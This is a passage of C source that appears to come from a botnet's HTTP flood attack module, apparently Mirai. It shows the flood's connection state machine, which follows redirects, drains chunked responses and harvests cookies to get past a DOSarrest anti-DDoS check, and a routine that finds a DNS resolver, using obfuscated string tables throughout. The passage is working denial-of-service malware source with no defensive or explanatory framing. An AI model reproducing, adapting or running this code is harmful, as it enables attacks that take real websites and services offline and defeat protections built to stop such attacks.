                                        util_strcpy(conn->domain, loc_ptr);

                                    if (util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                    {
                                        util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                        if (util_strlen(&(loc_ptr[ii + 1])) > 0)
                                            util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                                    }
                                }
                                else if (loc_ptr[0] == '/')
                                {
                                    //handle relative url
                                    if (util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                    {
                                        util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                        if (util_strlen(&(loc_ptr[ii + 1])) > 0)
                                            util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                                    }
                                }

                                strcpy(conn->method, "GET");
                                // queue the state up for the next time
                                conn->state = HTTP_CONN_QUEUE_RESTART;
                                continue;
                            }
                        }
                    }

                    // actually pull the content from the buffer that we processed via MSG_PEEK
                    processed = util_memsearch(generic_memes, ret, "\r\n\r\n", 4);

                    table_unlock_val(TABLE_ATK_POST);
                    if (util_strcmp(conn->method, table_retrieve_val(TABLE_ATK_POST, NULL)) || util_strcmp(conn->method, "GET"))
                        conn->state = HTTP_CONN_RECV_BODY;
                    else if (ret > processed)
                        conn->state = HTTP_CONN_QUEUE_RESTART;
                    else
                        conn->state = HTTP_CONN_RESTART;

                    table_lock_val(TABLE_ATK_POST);

                    ret = recv(conn->fd, generic_memes, processed, MSG_NOSIGNAL);
                } else if (conn->state == HTTP_CONN_RECV_BODY) {
                    while (TRUE)
                    {
                        // spooky doods changed state
                        if (conn->state != HTTP_CONN_RECV_BODY)
                        {
                            break;
                        }

                        if (conn->rdbuf_pos == HTTP_RDBUF_SIZE)
                        {
                            memmove(conn->rdbuf, conn->rdbuf + HTTP_HACK_DRAIN, HTTP_RDBUF_SIZE - HTTP_HACK_DRAIN);
                            conn->rdbuf_pos -= HTTP_HACK_DRAIN;
                        }
                        errno = 0;
                        ret = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, HTTP_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                        if (ret == 0)
                        {
#ifdef DEBUG
                            printf("[http flood] FD%d connection gracefully closed\n", conn->fd);
#endif
                            errno = ECONNRESET;
                            ret = -1; // Fall through to closing connection below
                        }
                        if (ret == -1)
                        {
                            if (errno != EAGAIN && errno != EWOULDBLOCK)
                            {
#ifdef DEBUG
                                printf("[http flood] FD%d lost connection\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = HTTP_CONN_INIT;
                            }
                            break;
                        }

                        conn->rdbuf_pos += ret;
                        conn->last_recv = fake_time;

                        while (TRUE)
                        {
                            int consumed = 0;

                            if (conn->content_length > 0)
                            {

                                consumed = conn->content_length > conn->rdbuf_pos ? conn->rdbuf_pos : conn->content_length;
                                conn->content_length -= consumed;

                                if (conn->protection_type == HTTP_PROT_DOSARREST)
                                {
                                    // we specifically want this to be case sensitive
                                    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_ATK_SET_COOKIE, NULL), 11) != -1)
                                    {
                                        int start_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_ATK_SET_COOKIE, NULL), 11);
                                        int end_pos = util_memsearch(&(conn->rdbuf[start_pos]), conn->rdbuf_pos - start_pos, "'", 1);
                                        conn->rdbuf[start_pos + (end_pos - 1)] = 0;

                                        if (conn->num_cookies < HTTP_COOKIE_MAX && util_strlen(&(conn->rdbuf[start_pos])) < HTTP_COOKIE_LEN_MAX)
                                        {
                                            util_strcpy(conn->cookies[conn->num_cookies], &(conn->rdbuf[start_pos]));
                                            util_strcpy(conn->cookies[conn->num_cookies] + util_strlen(conn->cookies[conn->num_cookies]), "=");

                                            start_pos += end_pos + 3;
                                            end_pos = util_memsearch(&(conn->rdbuf[start_pos]), conn->rdbuf_pos - start_pos, "'", 1);
                                            conn->rdbuf[start_pos + (end_pos - 1)] = 0;

                                            util_strcpy(conn->cookies[conn->num_cookies] + util_strlen(conn->cookies[conn->num_cookies]), &(conn->rdbuf[start_pos]));
                                            conn->num_cookies++;
                                        }

                                        conn->content_length = -1;
                                        conn->state = HTTP_CONN_QUEUE_RESTART;
                                        break;
                                    }
                                }
                            }

                            if (conn->content_length == 0)
                            {
                                if (conn->chunked == 1)
                                {
                                    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, "\r\n", 2) != -1)
                                    {
                                        int new_line_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "\r\n", 2);
                                        conn->rdbuf[new_line_pos - 2] = 0;
                                        if (util_memsearch(conn->rdbuf, new_line_pos, ";", 1) != -1)
                                            conn->rdbuf[util_memsearch(conn->rdbuf, new_line_pos, ";", 1)] = 0;

                                        int chunklen = util_atoi(conn->rdbuf, 16);

                                        if (chunklen == 0)
                                        {
                                            conn->state = HTTP_CONN_RESTART;
                                            break;
                                        }

                                        conn->content_length = chunklen + 2;
                                        consumed = new_line_pos;
                                    }
                                } else {
                                    // get rid of any extra in the buf before we move on...
                                    conn->content_length = conn->rdbuf_pos - consumed;
                                    if (conn->content_length == 0)
                                    {
                                        conn->state = HTTP_CONN_RESTART;
                                        break;
                                    }
                                }
                            }

                            if (consumed == 0)
                                break;
                            else
                            {
                                conn->rdbuf_pos -= consumed;
                                memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                                conn->rdbuf[conn->rdbuf_pos] = 0;

                                if (conn->rdbuf_pos == 0)
                                    break;
                            }
                        }
                    }
                } else if (conn->state == HTTP_CONN_QUEUE_RESTART) {
                    while(TRUE)
                    {
                        errno = 0;
                        ret = recv(conn->fd, generic_memes, 10240, MSG_NOSIGNAL);
                        if (ret == 0)
                        {
#ifdef DEBUG
                            printf("[http flood] HTTP_CONN_QUEUE_RESTART FD%d connection gracefully closed\n", conn->fd);
#endif
                            errno = ECONNRESET;
                            ret = -1; // Fall through to closing connection below
                        }
                        if (ret == -1)
                        {
                            if (errno != EAGAIN && errno != EWOULDBLOCK)
                            {
#ifdef DEBUG
                                printf("[http flood] HTTP_CONN_QUEUE_RESTART FD%d lost connection\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = HTTP_CONN_INIT;
                            }
                            break;
                        }    
                    }
                    if (conn->state != HTTP_CONN_INIT)
                        conn->state = HTTP_CONN_RESTART;
                }
            }
        }

        // handle any sockets that didnt return from select here
        // also handle timeout on HTTP_CONN_QUEUE_RESTART just in case there was no other data to be read (^: (usually this will never happen)
#ifdef DEBUG
        if (sockets == 1)
        {
            printf("debug mode sleep\n");
            sleep(1);
        }
#endif
    }
}

static ipv4_t get_dns_resolver(void)
{
    int fd;
    table_unlock_val(TABLE_ATK_RESOLVER);
    fd = open(table_retrieve_val(TABLE_ATK_RESOLVER, NULL), O_RDONLY);
    table_lock_val(TABLE_ATK_RESOLVER);
    if (fd >= 0)
    {
        int ret, nspos;
        char resolvbuf[2048];
        ret = read(fd, resolvbuf, sizeof (resolvbuf));
        close(fd);
        table_unlock_val(TABLE_ATK_NSERV);
        nspos = util_stristr(resolvbuf, ret, table_retrieve_val(TABLE_ATK_NSERV, NULL));
        table_lock_val(TABLE_ATK_NSERV);
        if (nspos != -1)
        {
            int i;
            char ipbuf[32];
            BOOL finished_whitespace = FALSE;
            BOOL found = FALSE;
            for (i = nspos; i < ret; i++)
            {
                char c = resolvbuf[i];
                if (!finished_whitespace)
                {
                    if (c == ' ' || c == '\t')
                        continue;
                    else
                        finished_whitespace = TRUE;
                }
                if ((c != '.' && (c < '0' || c > '9')) || (i == (ret - 1)))
                {
                    util_memcpy(ipbuf, resolvbuf + nspos, i - nspos);
                    ipbuf[i - nspos] = 0;
                    found = TRUE;
                    break;
                }
            }
            if (found)
            {
                return inet_addr(ipbuf);
            }
        }
    }
    switch (rand_next() % 4)
    {
    case 0:
        return INET_ADDR(8,8,8,8);
    case 1:
        return INET_ADDR(74,82,42,42);
    case 2:
        return INET_ADDR(64,6,64,6);
    case 3:
        return INET_ADDR(4,2,2,2);
    }
}
